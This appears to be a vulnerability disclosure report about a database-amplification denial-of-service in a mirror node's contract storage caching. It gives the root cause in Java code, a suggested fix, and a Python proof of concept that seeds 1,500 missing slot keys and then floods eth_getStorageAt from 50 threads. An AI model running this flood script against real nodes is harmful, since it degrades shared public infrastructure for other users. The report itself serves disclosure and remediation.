### Title
Cache Miss Amplification DoS via Non-Existent Contract Storage Slot Accumulation

### Summary
When `enableBatchContractSlotCaching` is enabled (the default), requesting storage slots that do not exist in the database causes those slot keys to be permanently accumulated in `contractSlotsCache` (slotsPerContract) but never written to `contractStateCache`. Because the `contractStateCache` hit-check at line 65 always fails for non-existent slots (`cachedValue` is always `null`), every subsequent request for any non-existent slot unconditionally re-invokes `findStorageBatch()` with the full accumulated slot list as the SQL `IN` clause. An unprivileged attacker can pre-fill the per-contract slot cache with up to 1,500 non-existent keys, then hammer the node with repeated lookups to force large batch DB queries on every single request.

### Finding Description

**Code path:** `ContractStateServiceImpl.java`, `findStorage()` lines 63–69 and `findStorageBatch()` lines 85–122.

**Root cause — the asymmetric caching of non-existent slots:**

In `findStorage()`, the short-circuit check is:
```java
final var cachedValue = contractStateCache.get(generateCacheKey(contractId, key), byte[].class);
if (cachedValue != null && cachedValue != EMPTY_VALUE) {
    return Optional.of(cachedValue);
}
return findStorageBatch(contractId, key);   // always reached for non-existent slots
``` [1](#0-0) 

In `findStorageBatch()`, the non-existent slot key is unconditionally added to the per-contract `contractSlotsCache`:
```java
contractSlotsCache.putIfAbsent(wrappedKey, EMPTY_VALUE);
``` [2](#0-1) 

Then the batch DB query runs over all accumulated keys:
```java
final var contractSlotValues = contractStateRepository.findStorageBatch(contractId.getId(), cachedSlots);
``` [3](#0-2) 

The result loop only writes to `contractStateCache` for slots that **actually exist** in the DB:
```java
for (final var contractSlotValue : contractSlotValues) {
    contractStateCache.put(generateCacheKey(contractId, slotKey), slotValue);
    ...
}
``` [4](#0-3) 

For non-existent slots the loop body never executes, so `contractStateCache` is never populated for them. On every future call, `contractStateCache.get(...)` returns `null`, the `cachedValue != null` guard fails, and `findStorageBatch()` is called again — with the full, ever-growing accumulated slot list.

**Cache size bounds (from `CacheProperties.java`):**
- `slotsPerContract`: `expireAfterAccess=5m, maximumSize=1500` — up to 1,500 non-existent slot keys per contract accumulate in the per-contract cache.
- `contractSlots`: `expireAfterAccess=5m, maximumSize=3000` — up to 3,000 contracts can each hold such a cache.
- `contractState`: `expireAfterWrite=2s, maximumSize=25000` — even real slot values expire every 2 seconds, after which the batch query fires again. [5](#0-4) 

### Impact Explanation
Each request for a non-existent slot triggers a SQL `SELECT … WHERE slot IN (…)` with up to 1,500 entries. With many concurrent requests (easily achievable via a script calling `eth_call` or `eth_getStorageAt`), the database receives a sustained flood of large batch queries. Because the `contractStateCache` TTL is only 2 seconds, even legitimate traffic for real slots re-triggers the batch query frequently, compounding the load. The net effect is unbounded amplification of DB CPU and I/O relative to the number of attacker-controlled requests, satisfying the ≥30% resource increase threshold without brute force.

### Likelihood Explanation
The JSON-RPC endpoints (`eth_call`, `eth_getStorageAt`) are publicly accessible with no authentication. Any caller can specify an arbitrary `contractId` and `slot` value. The attacker needs only to:
1. Know (or guess) a valid `contractId` (trivially obtained from public chain data).
2. Send requests with 1,500 distinct, non-existent 32-byte slot keys — a one-time setup step.
3. Continuously repeat requests for any of those slots to sustain the amplified DB load.

No special privileges, tokens, or on-chain transactions are required. The attack is fully repeatable and scriptable.

### Recommendation
Store a sentinel value in `contractStateCache` for slots confirmed absent from the DB, so the cache hit-check short-circuits on repeated lookups:

```java
// After the batch query, for every key in cachedSlots that had no DB result:
for (byte[] slot : cachedSlots) {
    SimpleKey ck = generateCacheKey(contractId, slot);
    if (contractStateCache.get(ck, byte[].class) == null) {
        contractStateCache.put(ck, EMPTY_VALUE);   // sentinel for "known absent"
    }
}
```

Then update the hit-check in `findStorage()` to treat `EMPTY_VALUE` as a definitive "not found" result and return `Optional.empty()` immediately, rather than falling through to `findStorageBatch()`:

```java
if (cachedValue != null) {
    return cachedValue == EMPTY_VALUE ? Optional.empty() : Optional.of(cachedValue);
}
```

This ensures that once a slot is confirmed absent, all future lookups are served from the cache without touching the DB or accumulating batch query load.

### Proof of Concept

**Preconditions:** Mirror node running with default config (`enableBatchContractSlotCaching=true`). A known valid `contractId` (e.g., `0.0.1234`).

**Step 1 — Fill the per-contract slot cache with 1,500 non-existent keys:**
```python
import requests, os

RPC = "http://<mirror-node>:8545"
CONTRACT = "0x" + "00" * 11 + "0000000004D2"  # contractId 0.0.1234

for i in range(1500):
    slot = hex(i + 0xDEAD_0000)  # slots that don't exist in DB
    requests.post(RPC, json={
        "jsonrpc": "2.0", "method": "eth_getStorageAt",
        "params": [CONTRACT, slot, "latest"], "id": i
    })
```

**Step 2 — Sustain amplified DB load with repeated requests:**
```python
import threading

def spam():
    while True:
        requests.post(RPC, json={
            "jsonrpc": "2.0", "method": "eth_getStorageAt",
            "params": [CONTRACT, "0xDEAD0000", "latest"], "id": 1
        })

for _ in range(50):
    threading.Thread(target=spam, daemon=True).start()
```

**Expected result:** Each of the 50 concurrent threads triggers `findStorageBatch()` with a 1,500-slot `IN` clause on every call, because `contractStateCache` is never populated for non-existent slots. DB CPU and query latency increase proportionally, exceeding the 30% resource consumption threshold.
